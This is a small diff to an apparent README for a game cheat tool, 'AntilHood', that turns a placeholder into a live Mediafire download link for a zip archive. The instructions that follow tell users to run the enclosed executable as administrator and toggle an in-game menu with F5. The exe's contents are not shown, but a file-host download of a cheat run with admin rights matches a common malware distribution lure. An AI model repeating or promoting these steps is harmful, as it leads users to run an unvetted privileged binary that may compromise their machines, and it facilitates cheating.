@@ -26,6 +26,6 @@
 
 ## 📥 Installation
 
-1. Download: [AntilHood.zip]([#](https://www.mediafire.com/file/z8nljm3h8g9jez0/AntilHood.zip/file))
+1. Download: [AntilHood.zip](https://www.mediafire.com/file/z8nljm3h8g9jez0/AntilHood.zip/file)
 2. Run "AntilHoodr.exe" as Admin
 3. Press F5 in-game to toggle menu
